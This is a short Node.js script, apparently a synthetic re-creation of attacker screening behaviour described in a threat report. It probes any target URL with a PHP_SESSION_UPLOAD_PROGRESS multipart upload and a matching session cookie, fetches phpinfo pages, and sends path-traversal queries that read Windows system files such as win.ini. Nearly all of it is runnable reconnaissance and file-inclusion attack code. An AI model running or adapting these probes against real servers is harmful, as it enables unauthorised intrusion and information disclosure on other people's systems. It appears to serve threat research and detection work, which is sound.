// Representative cross-language variant of the article's screening behaviors.
// This is synthetic, not recovered operator source. Requires Node.js 20+.
const { randomUUID } = require('node:crypto');
async function screen(base) {
    const sid = randomUUID().replaceAll('-', '');
    const marker = 'MARKER_' + sid.slice(0, 8) + '.txt';
    const boundary = 'probe-' + sid;
    const body = '--' + boundary + '\r\n' +
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' +
        sid + '\r\n--' + boundary + '\r\n' +
        'Content-Disposition: form-data; name="file"; filename="' + marker + '"\r\n' +
        'Content-Type: text/plain\r\n\r\nprobe\r\n--' + boundary + '--\r\n';
    const response = await fetch(base, {method: 'POST', body,
        headers: {'Cookie': 'PHPSESSID=' + sid,
                  'Content-Type': 'multipart/form-data; boundary=' + boundary}});
    const powered = response.headers.get('X-Powered-By');
    const server = response.headers.get('Server');
    const echoed = (response.headers.get('Set-Cookie') || '').includes(sid);
    console.log(powered, server, echoed);
    for (const path of ['/phpinfo.php', '/info.php', '/test/phpinfo.php']) {
        try { console.log(path, await (await fetch(base + path)).text()); } catch {}
    }
    // Windows path variant of the file-inclusion probe described in the report.
    for (const query of ['/?page=../../../../Windows/win.ini', '/?file=../../../../Windows/win.ini']) {
        try { console.log(query, await (await fetch(base + query)).text()); } catch {}
    }
}
for (const target of process.argv.slice(2)) screen(target.replace(/\/$/, ''));
